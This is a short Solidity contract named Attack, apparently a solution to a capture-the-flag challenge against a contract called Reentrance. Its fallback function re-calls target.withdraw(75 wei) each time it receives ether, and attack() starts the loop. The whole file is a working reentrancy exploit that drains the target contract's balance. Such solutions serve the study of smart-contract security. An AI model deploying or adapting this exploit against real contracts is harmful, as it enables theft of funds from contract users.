// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract Attack {
    Reentrance public target;

    constructor(address payable _ethStoreAddress) public {
        target = Reentrance(_ethStoreAddress);
    }

    fallback() external payable {
        if (address(target).balance >= 0) {
            target.withdraw(75 wei);
        }
    }

    function attack() external payable {
        // target.donate{value: 3 wei, gas: 40000000}(address(this));
        target.withdraw(75 wei);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
